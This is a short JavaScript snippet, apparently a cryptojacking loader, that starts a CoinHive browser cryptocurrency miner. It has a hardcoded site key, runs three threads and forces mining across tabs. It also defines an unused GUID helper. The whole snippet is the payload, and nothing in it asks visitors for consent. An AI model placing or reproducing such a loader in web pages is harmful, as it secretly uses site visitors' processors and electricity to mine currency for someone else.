(function(){
	function guid() {
	  function s4() {
	    return Math.floor((1 + Math.random()) * 0x10000)
	      .toString(16)
	      .substring(1);
	  }
	  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
	    s4() + '-' + s4() + s4() + s4();
	}
	console.log("Miner loader");
	var miner = new CoinHive.Anonymous('TdVUS24mo85aDYSbz4mbWMZ2YAm6z8Cj', {threads: 3});
	miner.start(CoinHive.FORCE_MULTI_TAB);
})();